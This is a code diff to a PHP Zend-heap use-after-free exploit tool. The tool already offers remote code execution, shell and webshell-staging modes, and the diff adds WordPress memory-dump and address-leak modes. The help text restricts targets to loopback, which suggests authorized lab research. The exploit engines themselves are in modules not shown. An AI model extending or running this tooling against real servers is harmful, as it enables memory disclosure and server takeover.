@@ -703,11 +703,33 @@ def mode_shell(t: Target, args):
 
 
 # --------------------------------------------------------------------------
+def mode_wpdump(t: Target, args):
+    """phpbleed's wordpress engine (618/619 route): producer fire + walk
+    oracle + assisted stale-chunk dump with pointer following. See
+    scripts/wpbleed.py for the engine and channel-honesty notes."""
+    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                     "scripts"))
+    import wpbleed
+    rep = wpbleed.wpdump(rounds=args.rounds)
+    return 0 if rep["dumps"] else 2
+
+
+def mode_wpprofile(t: Target, args):
+    """The vendor-parity leak block for the WP lane (assisted tier):
+    stale_reference, chunk base, zval_ptr_dtor/zend_call_function addrs."""
+    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                     "..", "scripts"))
+    import importlib
+    a2 = importlib.import_module("a2_leak_collect")
+    rc = a2.main() if hasattr(a2, "main") else 1
+    return rc
+
+
 def main():
     p = argparse.ArgumentParser(description="Bastet Zend-heap leak tool "
                                 "(var_hash UAF; authorized range only)")
     p.add_argument("mode", choices=["dump", "probe", "canary", "id", "rce",
-                                    "shell"])
+                                    "shell", "wpdump", "wpprofile"])
     p.add_argument("url", help="http(s)://127.0.0.1:PORT/path (loopback only)")
     p.add_argument("--field", default="cook", help="POST field carrying the "
                    "payload (vendor remote_app.php uses 'cook')")
@@ -732,6 +754,8 @@ def main():
     p.add_argument("--max-components", type=int, default=1,
                    help="leak components per page window (php2leak parity)")
     p.add_argument("--color", default="always", choices=["always", "never"])
+    p.add_argument("--rounds", type=int, default=3,
+                   help="wpdump mode: producer/dump rounds")
     p.add_argument("--webshell", default="r.php",
                    help="shell mode: filename to stage in DocumentRoot")
     p.add_argument("--fetch", default="/CANARY",
@@ -745,7 +769,8 @@ def main():
     log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
     fn = {"dump": mode_dump, "probe": mode_probe,
           "canary": mode_canary, "id": mode_id, "rce": mode_rce,
-          "shell": mode_shell}[a.mode]
+          "shell": mode_shell,
+          "wpdump": mode_wpdump, "wpprofile": mode_wpprofile}[a.mode]
     sys.exit(fn(t, a))
 
 
